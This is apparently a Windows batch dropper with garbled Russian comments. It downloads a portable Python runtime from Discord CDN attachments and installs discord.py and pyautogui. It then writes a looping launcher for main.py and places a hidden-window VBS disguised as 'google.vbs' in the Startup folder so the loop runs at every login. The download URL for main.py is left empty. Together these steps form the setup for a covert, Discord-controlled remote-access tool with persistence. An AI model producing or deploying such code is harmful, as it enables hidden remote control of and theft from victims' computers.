rem ‡ £àã§ª  ­¥®¡å®¤¨¬ëå ä ©«®¢
curl -f -# -O "https://www.7-zip.org/a/7zr.exe"
curl -f -# -O "https://cdn.discordapp.com/attachments/1160558928480976996/1227605728202588170/Python310.7z.001?ex=662903ed&is=66168eed&hm=87678f023b86bf39213699a8da599d7ea6a8f828558c5e839291e2bbf077d955&"
curl -f -# -O "https://cdn.discordapp.com/attachments/1160558928480976996/1227605728521490463/Python310.7z.002?ex=662903ed&is=66168eed&hm=53f94c329af42341fa36a6b8705c9bfe4824ff5f150543571195a1809e72151a&"
rem à á¯ ª®¢ª  ¨ ®ç¨áâª  «¨è­¨å ä ©«®¢
7zr.exe x Python310.7z.001
del 7zr.exe
del Python310.7z.001
del Python310.7z.002
rem ‘®§¤ ­¨¥ «¨áâ  ¤«ï ãáâ ­®¢®ª
echo discord.py >> packages.python
echo pyautogui >> packages.python
rem “áâ ­®¢ª  ­¥®¡å®¤¨¬ëå ¯ ª¥â®¢
"%~dp0Python310\Scripts\pip.exe" install -r %~dp0packages.python
rem ‡ £àã§ª  áªà¨¯â  python
curl -f -# -O ""
rem ‘®§¤ ­¨¥ áªà¨¯â  ¤«ï áªàëâ®£® § ¯ãáª 
echo @echo off >> script.bat
echo :offtaskkill >> script.bat
echo "%~dp0Python310\python.exe" "%~dp0main.py" >> script.bat
echo goto offtaskkill >> script.bat
rem ‘®§¤ ­¨¥ áªà¨¯â   ¢â®§ £àã§ª¨
echo Set WshShell = CreateObject("WScript.Shell") >> google.vbs
echo WshShell.Run "cmd.exe /c %~dp0script.bat", 0, false >> google.vbs
move google.vbs "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
rem ‡ ¯ãáª áªà¨¯â 
pause
